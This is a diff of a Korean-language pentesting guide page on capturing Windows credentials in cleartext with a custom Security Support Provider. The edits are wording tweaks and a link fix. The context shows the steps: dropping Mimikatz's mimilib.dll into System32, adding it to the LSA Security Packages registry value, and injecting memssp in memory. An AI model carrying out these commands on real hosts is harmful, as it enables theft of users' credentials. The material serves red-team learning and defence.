@@ -4,13 +4,13 @@
 
 ### Custom SSP
 
-[SSP(보안 지원 공급자)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+[SSP(보안 지원 공급자)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
 자신의 **SSP**를 생성하여 **명확한 텍스트**로 **자격 증명**을 **캡처**할 수 있습니다.
 
 #### Mimilib
 
 Mimikatz에서 제공하는 `mimilib.dll` 바이너리를 사용할 수 있습니다. **이것은 모든 자격 증명을 명확한 텍스트로 파일에 기록합니다.**\
-dll을 `C:\Windows\System32\`에 드롭하세요.\
+dll을 `C:\Windows\System32\`에 배치하세요.\
 기존 LSA 보안 패키지 목록을 가져옵니다:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
@@ -26,12 +26,12 @@ reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 
 #### 메모리 내
 
-Mimikatz를 사용하여 메모리에 직접 주입할 수도 있습니다(약간 불안정하거나 작동하지 않을 수 있습니다).
+Mimikatz를 사용하여 메모리에 직접 주입할 수도 있습니다(약간 불안정하거나 작동하지 않을 수 있습니다):
 ```powershell
 privilege::debug
 misc::memssp
 ```
-이것은 재부팅을 견디지 못합니다.
+이것은 재부팅 후에도 유지되지 않습니다.
 
 #### 완화
 
